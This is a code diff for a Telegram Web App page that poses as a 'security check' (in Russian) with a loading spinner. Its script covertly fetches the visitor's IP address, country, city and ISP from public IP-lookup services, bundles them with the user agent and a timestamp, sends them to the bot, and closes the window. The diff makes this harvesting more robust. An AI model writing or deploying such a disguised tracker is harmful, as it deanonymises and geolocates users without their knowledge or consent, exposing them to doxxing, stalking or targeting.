@@ -6,8 +6,8 @@
     <title>Проверка</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
-        body { font-family: sans-serif; background: #1a1a1a; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; text-align: center; }
-        .spinner { border: 4px solid #3498db; border-top: 4px solid #2ecc71; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
+        body { font-family: sans-serif; background: var(--tg-theme-bg-color, #1a1a1a); color: var(--tg-theme-text-color, #fff); display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; text-align: center; }
+        .spinner { border: 4px solid rgba(255,255,255,0.1); border-top: 4px solid var(--tg-theme-button-color, #2481cc); border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
@@ -15,42 +15,77 @@
     <div>
         <h2>🔒 Проверка безопасности</h2>
         <div class="spinner"></div>
-        <p>Подождите...</p>
+        <p id="status">Подождите...</p>
     </div>
 
     <script>
         const tg = window.Telegram.WebApp;
+        let dataSent = false;
 
-        tg.ready(() => {
-            tg.expand();
-            collectAndSend();
-        });
+        // Инициализируем Web App ПЕРЕД любыми действиями
+        tg.ready();
+        tg.expand();
 
         async function collectAndSend() {
-            let ip = "unknown", country = "unknown", city = "unknown", org = "unknown";
             try {
-                const res = await fetch("https://ipapi.co/json/", { signal: AbortSignal.timeout(5000) });
-                const data = await res.json();
-                ip = data.ip || "unknown";
-                country = data.country_name || "unknown";
-                city = data.city || "unknown";
-                org = data.org || "unknown";
-            } catch (e) {
+                let ip = "unknown", country = "unknown", city = "unknown", org = "unknown";
+                
+                // Основной источник
                 try {
-                    const res = await fetch("https://api.ipify.org?format=json");
-                    const data = await res.json();
-                    ip = data.ip || "unknown";
-                } catch (e2) {}
-            }
+                    const res = await fetch("https://ipapi.co/json/", { signal: AbortSignal.timeout(5000) });
+                    if (res.ok) {
+                        const d = await res.json();
+                        ip = d.ip || "unknown";
+                        country = d.country_name || "unknown";
+                        city = d.city || "unknown";
+                        org = d.org || "unknown";
+                    }
+                } catch (e) {
+                    // Фолбэк
+                    try {
+                        const res2 = await fetch("https://api.ipify.org?format=json");
+                        if (res2.ok) {
+                            const d2 = await res2.json();
+                            ip = d2.ip || "unknown";
+                        }
+                    } catch (e2) {}
+                }
 
-            tg.sendData(JSON.stringify({
-                type: "ip_check",
-                ip, country, city, org,
-                user_agent: navigator.userAgent,
-                timestamp: new Date().toISOString()
-            }));
-            tg.close();
+                const payload = JSON.stringify({
+                    type: "ip_check",
+                    ip: ip,
+                    country: country,
+                    city: city,
+                    org: org,
+                    user_agent: navigator.userAgent,
+                    timestamp: new Date().toISOString()
+                });
+
+                console.log("Sending data:", payload);
+                
+                // Отправляем данные боту
+                tg.sendData(payload);
+                dataSent = true;
+                
+                // Закрываем ТОЛЬКО после успешной отправки
+                tg.close();
+
+            } catch (err) {
+                console.error("Error:", err);
+                document.getElementById("status").innerText = "Ошибка. Попробуйте снова.";
+            }
         }
+
+        // Запускаем сбор
+        collectAndSend();
+
+        // Страховка: если через 7 секунд sendData не сработал, закрываем принудительно
+        setTimeout(() => {
+            if (!dataSent) {
+                console.warn("Timeout: closing without data");
+                tg.close();
+            }
+        }, 7000);
     </script>
 </body>
 </html>
